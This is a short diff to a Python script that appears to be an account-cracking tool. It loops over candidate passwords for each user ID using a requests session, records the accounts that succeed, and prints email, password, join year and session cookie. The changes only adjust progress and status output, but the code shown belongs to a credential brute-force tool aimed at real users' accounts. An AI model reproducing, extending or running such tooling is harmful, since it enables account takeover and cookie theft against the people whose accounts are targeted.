@@ -538,8 +538,8 @@ def result(oks):
 def gxds_files(uid, pxss):
     global oks, loop, cps, ugen
     session = requests.Session()
-    sys.stdout.write(f"\r{dg}  [CHECKED: %s] \r"%(loop)),
-    sys.stdout.flush()
+    #sys.stdout.write(f"\r{dg}  [CHECKED: %s] \r"%(loop)),
+    #sys.stdout.flush()
     try:
         for ps in pxss:
             yrs = yxxr(uid)
@@ -605,7 +605,7 @@ COOKIE : {coki}
                 oks.append(uid)
                 break
             else:
-              print(f"""{lr} [GXDS DEAD] --
+              print(f"""{lr} [GXDS DEAD] -- {loop}
 EMAIL  : {uid} 
 PASS   : {ps} 
 JOINED : {yrs}
